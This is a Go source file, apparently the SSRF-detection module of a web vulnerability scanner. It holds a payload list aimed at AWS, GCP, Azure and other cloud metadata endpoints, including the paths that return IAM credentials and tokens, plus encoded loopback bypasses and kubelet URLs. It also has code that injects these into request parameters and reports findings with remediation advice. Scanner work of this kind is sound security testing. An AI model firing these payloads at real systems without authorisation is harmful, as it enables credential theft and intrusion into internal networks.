package modules

import (
	"fmt"
	"nightfalllx/pkg/client"
	"strings"
	"time"
)

type SSRFModule struct{}

func NewSSRFModule() *SSRFModule {
	return &SSRFModule{}
}

func (m *SSRFModule) Name() string {
	return "ssrf"
}

func (m *SSRFModule) Description() string {
	return "Server-Side Request Forgery (SSRF) and Cloud Metadata exposure detector"
}

/*
CATEGORY: Server-Side Request Forgery (SSRF) and Cloud Metadata Probes (50+ entries)
Sources: PayloadsAllTheThings SSRF, OWASP SSRF, Cloud Provider Documentation (AWS, GCP, Azure, DO, OCI).
Contexts:
- AWS / OpenStack EC2 Metadata (169.254.169.254)
- Google Cloud Platform (GCP) Metadata (metadata.google.internal)
- Microsoft Azure Instance Metadata
- DigitalOcean Droplet Metadata
- Oracle Cloud Infrastructure (OCI) Metadata
- Alibaba Cloud ECS Metadata
- Kubernetes Pod & Kubelet API Endpoints
- Localhost & Loopback Variants (127.0.0.1, 0.0.0.0, 127.1, 0)
- Alternative IP Encodings (Decimal, Octal, Hex, IPv6)
- Loopback Domain Resolution Bypasses (localtest.me, nip.io)
*/
var ssrfProbes = []struct {
	TargetType string
	Payload    string
	Indicators []string
}{
	// 1. AWS / OpenStack EC2 Metadata
	{"Cloud Metadata (AWS/OpenStack)", "http://169.254.169.254/latest/meta-data/", []string{"ami-id", "instance-id", "local-ipv4", "security-groups"}},
	{"Cloud Metadata (AWS User-Data)", "http://169.254.169.254/latest/user-data/", []string{"#!/bin", "#cloud-config", "password", "token"}},
	{"Cloud Metadata (AWS IAM Security Credentials)", "http://169.254.169.254/latest/meta-data/iam/security-credentials/", []string{"AccessKeyId", "SecretAccessKey", "Token"}},
	{"Cloud Metadata (AWS Dynamic Info)", "http://169.254.169.254/latest/dynamic/instance-identity/document", []string{"accountId", "architecture", "availabilityZone", "instanceType"}},

	// 2. Google Cloud Platform (GCP)
	{"Cloud Metadata (GCP Default)", "http://metadata.google.internal/computeMetadata/v1/", []string{"instance/", "project/"}},
	{"Cloud Metadata (GCP IP)", "http://169.254.169.254/computeMetadata/v1/", []string{"instance/", "project/"}},
	{"Cloud Metadata (GCP Project ID)", "http://metadata.google.internal/computeMetadata/v1/project/project-id", []string{"computeMetadata"}},
	{"Cloud Metadata (GCP Token)", "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token", []string{"access_token", "token_type"}},

	// 3. Microsoft Azure
	{"Cloud Metadata (Azure Instance)", "http://169.254.169.254/metadata/instance?api-version=2021-02-01", []string{"compute", "network", "vmId", "subscriptionId"}},
	{"Cloud Metadata (Azure Identity)", "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/", []string{"access_token", "client_id"}},

	// 4. DigitalOcean
	{"Cloud Metadata (DigitalOcean)", "http://169.254.169.254/metadata/v1/", []string{"droplet_id", "hostname", "vendor_data"}},
	{"Cloud Metadata (DigitalOcean JSON)", "http://169.254.169.254/metadata/v1.json", []string{"droplet_id", "floating_ip"}},

	// 5. Oracle Cloud (OCI)
	{"Cloud Metadata (Oracle Cloud)", "http://169.254.169.254/opc/v1/instance/", []string{"availabilityDomain", "compartmentId", "id", "shape"}},
	{"Cloud Metadata (Oracle Cloud v2)", "http://169.254.169.254/opc/v2/instance/", []string{"canonicalName", "id", "region"}},

	// 6. Alibaba Cloud
	{"Cloud Metadata (Alibaba Cloud)", "http://100.100.100.200/latest/meta-data/", []string{"image-id", "instance-id", "zone-id"}},

	// 7. Kubernetes Internal Endpoints
	{"Kubernetes Service", "https://kubernetes.default.svc/", []string{"Unauthorized", "k8s", "API"}},
	{"Kubernetes Kubelet API", "http://127.0.0.1:10255/pods", []string{"items", "metadata", "pod"}},
	{"Kubernetes Kubelet Health", "http://127.0.0.1:10248/healthz", []string{"ok"}},

	// 8. Local Loopback IPv4 & Common Port Services
	{"Local Loopback", "http://127.0.0.1:80/", []string{"welcome to nginx", "apache2 ubuntu default page", "iis windows server", "test page for apache"}},
	{"Local Loopback Port 8080", "http://127.0.0.1:8080/", []string{"jenkins", "apache tomcat", "glassfish", "hikaricp"}},
	{"Local Loopback Port 8000", "http://127.0.0.1:8000/", []string{"werkzeug", "django administration", "simplehttpserver"}},
	{"Local Loopback Port 3000", "http://127.0.0.1:3000/", []string{"grafana", "next.js", "ruby on rails"}},
	{"Local Loopback Port 5000", "http://127.0.0.1:5000/", []string{"docker-distribution", "flask", "registry v2"}},
	{"Local Loopback Port 9000", "http://127.0.0.1:9000/", []string{"minio console", "php-fpm status", "sonarqube"}},

	// 9. Short & Zero IP Representations
	{"Local Loopback Short (127.1)", "http://127.1/", []string{"welcome to nginx", "apache2 default page", "iis windows server"}},
	{"Local Loopback Short (127.0.1)", "http://127.0.1/", []string{"welcome to nginx", "apache2 default page", "iis windows server"}},
	{"Local Loopback Zero (0.0.0.0)", "http://0.0.0.0:80/", []string{"welcome to nginx", "apache2 default page", "iis windows server"}},
	{"Local Loopback Single Zero (0)", "http://0:80/", []string{"welcome to nginx", "apache2 default page", "iis windows server"}},

	// 10. Alternative Encodings (Decimal, Octal, Hex)
	{"Decimal Encoded IP (2130706433)", "http://2130706433/", []string{"welcome to nginx", "apache2 default page", "iis windows server"}},
	{"Octal Encoded IP (0177.0.0.1)", "http://0177.0.0.1/", []string{"welcome to nginx", "apache2 default page", "iis windows server"}},
	{"Hex Encoded IP (0x7f000001)", "http://0x7f000001/", []string{"welcome to nginx", "apache2 default page", "iis windows server"}},
	{"Dotted Hex Encoded IP", "http://0x7f.0.0.1/", []string{"welcome to nginx", "apache2 default page", "iis windows server"}},
	{"Mixed Octal/Decimal IP", "http://0177.1/", []string{"welcome to nginx", "apache2 default page", "iis windows server"}},

	// 11. IPv6 Loopback Formats
	{"Localhost IPv6", "http://[::1]:80/", []string{"welcome to nginx", "apache2 default page", "iis windows server"}},
	{"Localhost IPv6 Full (0:0:0:0:0:0:0:1)", "http://[0000::1]:80/", []string{"welcome to nginx", "apache2 default page", "iis windows server"}},
	{"IPv4-mapped IPv6 Address", "http://[::ffff:127.0.0.1]/", []string{"welcome to nginx", "apache2 default page", "iis windows server"}},
	{"IPv4-mapped IPv6 Port 8080", "http://[::ffff:127.0.0.1]:8080/", []string{"apache tomcat", "jenkins", "hikaricp"}},

	// 12. DNS Loopback Resolution Bypasses
	{"Loopback Domain (localhost)", "http://localhost/", []string{"welcome to nginx", "apache2 default page", "iis windows server"}},
	{"Loopback Domain (localtest.me)", "http://localtest.me/", []string{"welcome to nginx", "apache2 default page", "iis windows server"}},
	{"Loopback Domain (127.0.0.1.nip.io)", "http://127.0.0.1.nip.io/", []string{"welcome to nginx", "apache2 default page", "iis windows server"}},
	{"Loopback Domain (spoofed subdomain)", "http://localhost.target.lab/", []string{"welcome to nginx", "apache2 default page", "iis windows server"}},
}

func (m *SSRFModule) Run(target *Target, c *client.Client) ([]*Finding, error) {
	var findings []*Finding
	isPost := strings.ToUpper(target.Method) == "POST"

	// Fetch baseline to avoid false positives on responses naturally containing indicators
	var baselineBodyLower string
	if isPost {
		bHeaders := map[string]string{}
		if target.IsJSON {
			bHeaders["Content-Type"] = "application/json"
		}
		if bResp, err := c.Request("POST", target.URL, target.RawJSON, bHeaders); err == nil && bResp != nil {
			baselineBodyLower = strings.ToLower(bResp.Body)
		}
	} else {
		if bResp, err := c.Request("GET", target.URL, "", nil); err == nil && bResp != nil {
			baselineBodyLower = strings.ToLower(bResp.Body)
		}
	}

	for _, param := range target.Parameters() {
		paramLower := strings.ToLower(param)
		if !strings.Contains(paramLower, "url") &&
			!strings.Contains(paramLower, "uri") &&
			!strings.Contains(paramLower, "dest") &&
			!strings.Contains(paramLower, "link") &&
			!strings.Contains(paramLower, "feed") &&
			!strings.Contains(paramLower, "image") &&
			!strings.Contains(paramLower, "path") &&
			!strings.Contains(paramLower, "fetch") &&
			!strings.Contains(paramLower, "host") {
			if len(target.Parameters()) > 3 {
				continue
			}
		}

		// 1. Out-Of-Band (OAST) Blind SSRF testing if listener configured
		if target.OAST != nil {
			probeID := target.OAST.GenerateProbeID()
			cbURL := target.OAST.CallbackURL(probeID)
			subURL := target.OAST.SubdomainURL(probeID)

			for _, testURL := range []string{cbURL, subURL} {
				var err error
				if isPost {
					headers := map[string]string{}
					if target.IsJSON {
						headers["Content-Type"] = "application/json"
					}
					_, err = c.Request("POST", target.URL, target.BuildBodyWithParam(param, testURL), headers)
				} else {
					_, err = c.Request("GET", target.BuildURLWithParam(param, testURL), "", nil)
				}
				if err != nil {
					continue
				}

				if hit, ok := target.OAST.WaitForHit(probeID, 3*time.Second); ok && hit != nil {
					f := &Finding{
						Module:      m.Name(),
						Title:       "Blind Server-Side Request Forgery (OAST Callback Confirmed)",
						Severity:    SeverityCritical,
						URL:         target.URL,
						Parameter:   param,
						Payload:     testURL,
						Detail:      fmt.Sprintf("Server initiated out-of-band HTTP request to callback handler for probe %s.", probeID),
						Evidence:    fmt.Sprintf("OAST hit received from %s at %s (%s %s)", hit.RemoteAddr, hit.Timestamp.Format(time.RFC3339), hit.Method, hit.Path),
						Remediation: "Implement strict allow-listing for server-side HTTP fetch requests and restrict network egress.",
						CWEID:       918,
					}
					f.SetConfidence(ConfidenceConfirmed)
					findings = append(findings, f)
					break
				}
			}
		}

		// 2. Direct response indicator probes (Cloud metadata, loopback)
		for _, probe := range ssrfProbes {
			var resp *client.Response
			var err error

			if isPost {
				headers := map[string]string{}
				if target.IsJSON {
					headers["Content-Type"] = "application/json"
				}
				resp, err = c.Request("POST", target.URL, target.BuildBodyWithParam(param, probe.Payload), headers)
			} else {
				resp, err = c.Request("GET", target.BuildURLWithParam(param, probe.Payload), "", nil)
			}

			if err != nil || resp == nil || resp.Body == "" {
				continue
			}

			bodyLower := strings.ToLower(resp.Body)
			matched := false
			for _, ind := range probe.Indicators {
				if strings.Contains(bodyLower, ind) {
					if baselineBodyLower == "" || !strings.Contains(baselineBodyLower, ind) {
						matched = true
						break
					}
				}
			}

			if matched {
				evidence := resp.Body
				if len(evidence) > 200 {
					evidence = evidence[:200]
				}
				f := &Finding{
					Module:      m.Name(),
					Title:       fmt.Sprintf("Server-Side Request Forgery (%s)", probe.TargetType),
					Severity:    SeverityCritical,
					URL:         target.URL,
					Parameter:   param,
					Payload:     probe.Payload,
					Detail:      fmt.Sprintf("Server-side request dispatched to internal target '%s' and returned sensitive indicators.", probe.Payload),
					Evidence:    fmt.Sprintf("Response snippet: %s", evidence),
					Remediation: "Implement strict server-side egress filtering. Restrict outgoing requests to an allowlist and block 127.0.0.0/8 and 169.254.169.254.",
					CWEID:       918,
				}
				f.SetConfidence(ConfidenceProbable)
				findings = append(findings, f)
				break
			}
		}
	}

	return findings, nil
}
